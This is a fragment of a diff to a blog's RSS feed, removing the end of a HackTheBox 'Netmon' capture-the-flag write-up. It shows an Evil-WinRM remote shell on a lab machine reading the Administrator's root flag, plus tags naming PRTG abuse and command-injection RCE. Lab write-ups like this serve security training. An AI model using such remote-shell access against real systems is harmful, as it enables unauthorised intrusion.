-&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;*Evil-WinRM* PS C:\Users&amp;gt; cd Administrator
-*Evil-WinRM* PS C:\Users\Administrator&amp;gt; cd Desktop
-*Evil-WinRM* PS C:\Users\Administrator\Desktop&amp;gt; type root.txt
-491b992fe825994a2fad4199afd2ca76
-&lt;/code&gt;&lt;/pre&gt;
-
-</description>
-        <pubDate>Tue, 13 Jun 2023 00:00:00 +0000</pubDate>
-        <link>http://localhost:4000/hackthebox/htb-writeup-Netmon</link>
-        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Netmon</guid>
-        
-        <category>ftp enumeration</category>
-        
-        <category>absing PRTG Network Monitor</category>
-        
-        <category>Command Injection RCE</category>
         
         
         <category>hackthebox</category>
